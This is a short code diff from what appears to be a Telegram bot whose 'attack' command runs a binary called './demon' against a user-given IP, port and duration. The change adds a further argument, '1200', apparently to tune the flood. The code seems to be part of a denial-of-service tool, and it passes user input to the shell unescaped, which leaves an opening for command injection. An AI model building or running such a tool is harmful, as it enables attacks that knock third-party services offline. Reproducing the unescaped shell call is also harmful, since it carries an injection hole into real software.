@@ -114,7 +114,7 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     )
 
     try:
-        process = subprocess.Popen(f"./demon {ip} {port} {duration}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        process = subprocess.Popen(f"./demon {ip} {port} {duration} 1200", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         process.communicate()
 
         if process.returncode != 0:
